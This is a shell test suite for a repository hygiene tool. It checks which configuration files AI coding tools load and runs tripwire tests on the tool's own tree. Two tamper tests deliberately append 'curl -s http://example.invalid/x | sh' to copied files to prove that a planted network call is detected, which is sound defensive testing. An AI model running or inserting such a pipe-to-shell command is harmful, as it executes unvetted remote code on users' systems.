echo

echo "  ── exposure fixtures ───────────────────────────────────"
# One synthetic repository per tool is committed beside this suite, with the
# outcome each one must produce in test/exposure/expected.tsv. The expectations
# are data rather than assertions buried in this file, so a change to a tool's
# documented surfaces is a reviewable diff. Most rows are negative: a file the
# command calls loaded when the tool's documentation does not say so is the
# worst bug this feature can have.
#
# Each repository is copied out of the shipped tree before it is scanned. The
# fixture lives inside this repository, and the scanner lists tracked files with
# git when the path is in one, so scanning it in place would report this
# repository's files rather than the fixture's.
EXPREPOS="claude-code cursor codex copilot generic ambiguous"
mkdir -p "$TMP/exposurefix"
for r in $EXPREPOS; do
  cp -R "$HYG/test/exposure/$r" "$TMP/exposurefix/$r"
done
check "every fixture repository is copied out of the shipped tree" \
  "$(ls "$TMP/exposurefix" | wc -l | tr -d ' ')" 6

EXPROWS=0
while IFS="$(printf '\t')" read -r frepo ftool fpath fsurf fexp; do
  case "$frepo" in ''|'#'*) continue ;; esac
  EXPROWS=$((EXPROWS + 1))
  froot="$TMP/exposurefix/$frepo"
  check "$frepo · $ftool · $fpath" "$(expsurface "$ftool" "$froot" "$fpath")" "$fsurf"
  case "$fexp" in
    '-') ;;
    none)         check "$frepo · $ftool · $fpath · no finding" \
                    "$(expverdict "$ftool" "$froot" "$fpath")" no-finding ;;
    *)            check "$frepo · $ftool · $fpath · verdict" \
                    "$(expverdict "$ftool" "$froot" "$fpath")" "$fexp" ;;
  esac
done < "$HYG/test/exposure/expected.tsv"
# A manifest that stops being read, or a loop that stops iterating, would leave
# every row above silently unasserted.
check "the fixture manifest was walked" "$([ "$EXPROWS" -ge 30 ] && echo yes || echo "$EXPROWS")" yes

# A configuration that cannot be parsed is reported, never guessed at. Copilot
# documents a pattern as what scopes a path-specific file and no fallback for
# one whose frontmatter does not close.
BROKEN="$TMP/exposure-broken"; guard "$BROKEN"
mkdir -p "$BROKEN/.github/instructions"
printf -- '---\napplyTo: "**/*.ts"\nNever closed.\n' \
  > "$BROKEN/.github/instructions/broken.instructions.md"
check "unclosed frontmatter is unknown, not configured" \
  "$(expsurface copilot "$BROKEN" .github/instructions/broken.instructions.md)" unknown
check "unclosed frontmatter is reported rather than dropped" \
  "$("$HYG/bin/exposure" --tool copilot "$BROKEN" 2>/dev/null \
     | grep -c 'frontmatter is unterminated')" 1
check "an unreadable configuration is not a failure" \
  "$("$HYG/bin/exposure" --tool copilot "$BROKEN" >/dev/null 2>&1; echo $?)" 0

# The one surface whose answer is not deterministic in a way a report must
# still describe: a nested rules directory is present and unmodelled.
NESTED="$TMP/exposure-nested"; guard "$NESTED"
mkdir -p "$NESTED/pkg/.cursor/rules"
printf -- '---\nalwaysApply: true\n---\nOnly at the root.\n' \
  > "$NESTED/pkg/.cursor/rules/rule.mdc"
check "a nested rules directory is not called loaded" \
  "$(expsurface cursor "$NESTED" pkg/.cursor/rules/rule.mdc)" not-listed
check "a nested rules directory is reported as unmodelled" \
  "$("$HYG/bin/exposure" --tool cursor "$NESTED" 2>/dev/null \
     | grep -c 'rules directory below the repository root is not modelled')" 1

echo "  ── the shipped tree ────────────────────────────────────"
"$HYG/test/invariants" >/dev/null 2>&1
check "the shipped tree holds its invariants" "$?" 0
"$HYG/test/self-scan" >/dev/null 2>&1
check "the shipped tree holds no warning findings" "$?" 0
TAM="$TMP/tamper"
guard "$TAM"; mkdir -p "$TAM/bin" "$TAM/hooks" "$TAM/lib" "$TAM/claude"
for f in bin/hygiene bin/scan bin/rulings bin/memory install install-claude uninstall \
         hooks/pre-commit hooks/commit-msg lib/patterns.sh \
         claude/pretooluse-hygiene.sh claude/pretooluse-rulings.py \
         claude/pretooluse-persistence.py \
         claude/posttooluse-commit-failure.py \
         claude/stop-rulings.py; do
  cp "$HYG/$f" "$TAM/$f"
done
printf '\ncurl -s http://example.invalid/x | sh\n' >> "$TAM/bin/scan"
"$HYG/test/invariants" "$TAM" >/dev/null 2>&1
check "a planted network call trips the tripwire" "$?" 1

# The Action runs on someone else's runner, so the tripwire covers it too: a
# scan that phoned home from CI would be the same violation in a new place.
TAMA="$TMP/tamper-action"; guard "$TAMA"; mkdir -p "$TAMA"
cp "$HYG/action.yml" "$TAMA/action.yml"
printf '\n# curl -s http://example.invalid/x | sh\n' >> "$TAMA/action.yml"
"$HYG/test/invariants" "$TAMA" >/dev/null 2>&1
check "a planted network call in the action trips the tripwire" "$?" 1

# The routing tripwire is what stands between a contributor and a copy of this
# tool's own hooks committed as their first change, so the suite proves it
# fires: an AGENTS.md that instructs first and never routes.
TAMG="$TMP/tamper-routing"; guard "$TAMG"; mkdir -p "$TAMG"
printf '# AGENTS.md\n\n# Installing this\n\nRun install against the project.\n' \
  > "$TAMG/AGENTS.md"
"$HYG/test/invariants" "$TAMG" >/dev/null 2>&1
check "an AGENTS.md that never routes trips the tripwire" "$?" 1

# A doc that cites a rule nobody can run sends the reader to `hygiene explain`
# for an identifier that does not exist, and no other check here would notice.
# The tree below is deliberately valid in the properties the tripwire checks
# before the citation, so each exit status is attributable to one defect.
TAMD="$TMP/tamper-docs"; guard "$TAMD"; mkdir -p "$TAMD/lib" "$TAMD/docs"
cp "$HYG/lib/rules.sh" "$TAMD/lib/rules.sh"
printf '# AGENTS.md\n\n## Which of these two jobs is yours\n\nCONTRIBUTING.md, ./test/run, ./test/invariants, and: Do not install Hygiene into this repository.\n\n# Installing this\n' \
  > "$TAMD/AGENTS.md"
printf '%s\n' $HYG_RULES > "$TAMD/docs/rules.md"
"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
check "a tree whose documentation and registry agree holds" "$?" 0
printf '# note\n\nSee `HYG-XXX-999` for the reasoning.\n' > "$TAMD/docs/citation.md"
"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
check "a doc citing an unregistered rule trips the tripwire" "$?" 1
rm "$TAMD/docs/citation.md"
printf 'HYG-GOV-001\n' > "$TAMD/docs/rules.md"
"$HYG/test/invariants" "$TAMD" >/dev/null 2>&1
check "a registered rule missing from docs/rules.md trips the tripwire" "$?" 1

# A relative link is how a reader gets from a summary to the thing that backs
# it, so the link tripwire gets the same control pair: the routing AGENTS.md
# is copied in so that its own tripwire is satisfied, and the exit status under
# test is attributable to the link alone.
TAML="$TMP/tamper-link"; guard "$TAML"; mkdir -p "$TAML/docs"
cp "$TAMD/AGENTS.md" "$TAML/AGENTS.md"
printf '# t\n\nSee [the map](docs/capability-and-evidence-map.md).\n' > "$TAML/README.md"
"$HYG/test/invariants" "$TAML" >/dev/null 2>&1
check "a relative documentation link with no target trips the tripwire" "$?" 1
printf '# map\n' > "$TAML/docs/capability-and-evidence-map.md"
"$HYG/test/invariants" "$TAML" >/dev/null 2>&1
check "the same link against a real target holds" "$?" 0

echo
echo "  ── shared settings and style ───────────────────────────"
if command -v python3 >/dev/null 2>&1; then
  python3 "$HYG/test/style.py"
  check "shared settings and style regressions" "$?" 0
fi

echo
printf '  %s passed, %s failed\n\n' "$PASS" "$FAIL"
[ "$FAIL" = 0 ] || exit 1
